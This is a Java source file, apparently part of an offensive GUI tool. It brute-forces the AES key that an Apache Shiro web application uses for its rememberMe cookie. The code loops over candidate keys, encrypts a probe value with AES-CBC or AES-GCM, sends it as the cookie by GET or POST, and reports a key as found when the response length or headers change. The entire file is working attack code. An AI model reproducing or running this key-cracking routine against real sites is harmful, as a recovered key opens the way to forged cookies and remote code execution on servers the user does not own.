package cn.safe6.core;

import cn.safe6.Controller;
import cn.safe6.util.HttpClientUtil;
import cn.safe6.util.PayloadEncryptTool;
import cn.safe6.util.ShiroTool;
import javafx.application.Platform;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.util.EntityUtils;


import java.util.*;
import java.util.concurrent.Callable;

/**
 *  爆破key
 */

public class BurstJob implements Callable<String> {
    private String url;
    private String method;
    private Map<String,Object> params;
    private List<String> keys;
    final private Controller controller = (Controller) ControllersFactory.controllers.get(Controller.class.getSimpleName());
    final private Map<String,Object> paramsContext = ControllersFactory.paramsContext;


    public BurstJob(String url, String method, Map<String,Object> params, List<String> keys) {
        this.url = url;
        this.method = method;
        this.params = params;
        this.keys = keys;
    }

    @Override
    public String call() {

        //是否用post提交
        boolean isPost = false;
        //默认错误长度
        int errLen = 0;
        //默认存在 remember
        boolean isExistMB =true;
        String rememberMe = paramsContext.get("rmeValue").toString();

        try {
            Controller.logUtil.printInfoLog("开始爆破默认key",false);

            //错误包长度
            Map<String, Object> header = (Map<String, Object>)paramsContext.get("header");
            if (header==null){
                header = new HashMap<>();
            }
            Object oldCookie = null;
            //在原有cookie后面追加
            if (header.get("cookie")!=null){
                oldCookie = header.get("cookie");
                if (!header.get("cookie").toString().contains(rememberMe)){
                    header.put("cookie",oldCookie+";"+rememberMe+"=123456");
                }
            }else {
                header.put("cookie",rememberMe+"=123456");
            }

            if(paramsContext.get("method").equals(Constants.METHOD_GET)){
                CloseableHttpResponse response = HttpClientUtil.httpGetRequest3(url,header);
                if (response!=null){
                   String data = EntityUtils.toString(response.getEntity(),"utf-8");
                   errLen = data.length();
                   if (!Arrays.toString(response.getAllHeaders()).contains(rememberMe)){
                       isExistMB = false;
                   }
                }

            }else {
                isPost = true;
                CloseableHttpResponse response = HttpClientUtil.httpPostRequest2(url,header,params);
                if (response!=null){
                    String data = EntityUtils.toString(response.getEntity(),"utf-8");
                    errLen = data.length();
                    if (!Arrays.toString(response.getAllHeaders()).contains(rememberMe)){
                        isExistMB = false;
                    }
                }
            }


            for (String key : keys) {
                Controller.logUtil.printInfoLog("检测"+key,false);
                String encryptData;
                if (paramsContext.get("AES").equals(Constants.AES_GCM)){
                    encryptData = PayloadEncryptTool.AesGcmEncrypt(ShiroTool.getDetectText(),key);
                }else {
                    encryptData = PayloadEncryptTool.AesCbcEncrypt(ShiroTool.getDetectText(),key);
                }

                //请求包header超过8k会报header too large错误
                if (oldCookie!=null){
                    header.put("cookie",oldCookie+";"+rememberMe+"="+encryptData);
                }else {
                    header.put("cookie",rememberMe+"="+encryptData);
                }

                //System.out.println(header.get("cookie"));
                String data = null;
                CloseableHttpResponse response;
                String resHeader="";
                if(!isPost){
                    response = HttpClientUtil.httpGetRequest3(url,header);
                    if (response!=null){
                        resHeader = Arrays.toString(response.getAllHeaders());
                        data = EntityUtils.toString(response.getEntity(),"utf-8");
                    }
                }else {
                    response = HttpClientUtil.httpPostRequest2(url,header,params);
                    if (response!=null){
                        resHeader = Arrays.toString(response.getAllHeaders());
                        data = EntityUtils.toString(response.getEntity(),"utf-8");
                    }
                }

                //输出详情
                if (controller.isShowPayload.isSelected()){
                    //System.out.println(""+Controller.logUtil.getLog().getCaretPosition());
                    Controller.logUtil.printData(encryptData);
                    Controller.logUtil.printData(resHeader);
                }else {
                    Controller.logUtil.getLog().selectPositionCaret(Controller.logUtil.getLog().getText().length());
                }

                //用长度进行第一次判断
                if (data!=null&&errLen!=data.length()){
                    if (isExistMB&&resHeader.contains(rememberMe)){
                        Controller.logUtil.printSucceedLog("爆破成功！发现"+key);
                        controller.aesKey.setText(key);
                        break;
                    }else {
                        Controller.logUtil.printSucceedLog("爆破成功！发现"+key);
                        controller.aesKey.setText(key);
                        break;
                    }
                }else {
                    if (isExistMB&&!resHeader.contains(rememberMe)){
                        Controller.logUtil.printSucceedLog("爆破成功！发现"+key);
                        controller.aesKey.setText(key);
                        break;
                    }
                    Controller.logUtil.printAbortedLog("秘钥错误",false);
                }
            }
            Controller.logUtil.printInfoLog("爆破结束!",true);
        }catch (Exception e){
            e.printStackTrace();
        }finally {
            //Controller.logUtil.getLog().selectPositionCaret(controller.log.getText().length());
            Platform.runLater(() -> {
                controller.burstKey.setDisable(false);
            });
        }
        return "";
    }



    public String getUrl() {
        return url;
    }

    public void setUrl(String url) {
        this.url = url;
    }

    public String getMethod() {
        return method;
    }

    public void setMethod(String method) {
        this.method = method;
    }

    public Map<String, Object> getParams() {
        return params;
    }

    public void setParams(Map<String, Object> params) {
        this.params = params;
    }

    public List<String> getKeys() {
        return keys;
    }

    public void setKeys(List<String> keys) {
        this.keys = keys;
    }


}
